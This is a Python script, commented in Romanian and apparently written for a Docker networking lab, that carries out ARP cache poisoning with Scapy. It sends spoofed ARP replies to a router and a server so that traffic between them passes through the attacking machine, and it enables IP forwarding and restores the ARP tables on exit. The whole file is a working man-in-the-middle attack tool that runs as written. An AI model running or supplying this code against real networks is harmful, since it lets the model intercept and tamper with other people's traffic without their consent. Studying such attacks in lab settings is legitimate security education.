# referinta cod: https://ismailakkila.medium.com/black-hat-python-arp-cache-poisoning-with-scapy-7cb1d8b9d242

from scapy.all import *
import os
import signal
import sys
import threading
import time

#ARP Poison parameters
gateway_ip = "198.7.0.1"   # router net2 IP
target_ip = "198.7.0.2"    # server IP
# pe ce interfata se face atacul in sine
conf.iface = "eth0"         # eth0 = nume interfata linux in docker 
conf.verb = 0 # pus pentru a nu printa multe mesaje de la scapy

# functie care afla adresa MAC fiind dat un IP 
# face efectiv un ARP request si returneaza adresa mac a raspunsului
def get_mac(ip_address):
    #ARP request is constructed. sr function is used to send/ receive a layer 3 packet
    # sr = send/ receive packets, returneaza 2 liste: resp = tuplu (sent, received) cu pachetele care au primit raspuns si unans cand nu s-a primit raspuns
    # op = 1 = optiunea 1 = request ARP 
    # op = 2 ar insemna un ARP reply 
    # hwdst = "ff..." = broadcast MAC address
    # pdst = adresa IP dupa care se cauta adresa MAC
    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)
    for s,r in resp:  # pentru fiecare tuplu (sent, received) din lista resp
        return r[ARP].hwsrc # returneaza adresa MAC a raspunsului ARP primit
    return None

#Restore the network by reversing the ARP poison attack. Broadcast ARP Reply with
#correct MAC and IP Address information
def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5)
    print("[*] Disabling IP forwarding")
    os.system("sysctl -w net.ipv4.ip_forward=0")
    #kill process
    os.kill(os.getpid(), signal.SIGTERM)

# practic un true/false legat de cat de mult sa ruleze thread-urile
# cand incep thread-urile acesta NU e setat
# cand primeste CNTRL-C se seteaza si thread-urile verifica asta nemaitrimitand reply-uri ARP
stop_event = threading.Event()

# in codul de referinta aceste functii erau initial implementate in una singura
# ambele thread-uri functioneaza similar in sensul ca trimit un raspuns ARP in care se completeaza automat hwrsc cu valoarea MAC a propriei interfete (man in the middle)
# deci routerul intelege ca serverul este la adresa MAC a masinii curente/ middle
def arp_poison_router(gateway_ip, gateway_mac, target_ip):
    while not stop_event.is_set():
        send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
        time.sleep(2)
# pdst is where the ARP packet should go (target),
# psrc is the IP to update in the target's arp table,
# hwsrc is the MAC corresponding to psrc, to update in the target's arp table
# hwdst is the destination hardware address

# analog pentru server in loc de router
def arp_poison_server(target_ip, target_mac, gateway_ip):
    while not stop_event.is_set():
        send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
        time.sleep(2)

#Start the script
print("[*] Starting script: arp_poison.py")
print("[*] Enabling IP forwarding")
os.system("sysctl -w net.ipv4.ip_forward=1") # ip forward super necesar pentur ca altfel sunt dropate pachetele by default 


print(f"[*] Gateway IP address: {gateway_ip}")
print(f"[*] Target IP address: {target_ip}")

gateway_mac = get_mac(gateway_ip) # aflarea adresei MAC a ruterului 
if gateway_mac is None:
    print("[!] Unable to get gateway MAC address. Exiting..")
    sys.exit(0)
else:
    print(f"[*] Gateway MAC address: {gateway_mac}")

target_mac = get_mac(target_ip) # adresa MAC a server-ului
if target_mac is None:
    print("[!] Unable to get target MAC address. Exiting..")
    sys.exit(0)
else:
    print(f"[*] Target MAC address: {target_mac}")

# crearea celor 2 thread-uri care fac efectiv atacul 
poison_router_thread = threading.Thread(target=arp_poison_router, args=(gateway_ip, gateway_mac, target_ip))
poison_server_thread = threading.Thread(target=arp_poison_server, args=(target_ip, target_mac, gateway_ip))

poison_router_thread.start()
poison_server_thread.start()
print("[*] ARP poison attack running [CTRL-C to stop]")

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("[*] Stopping ARP poison attack. Restoring network")
    stop_event.set()
    poison_router_thread.join()
    poison_server_thread.join()
    restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
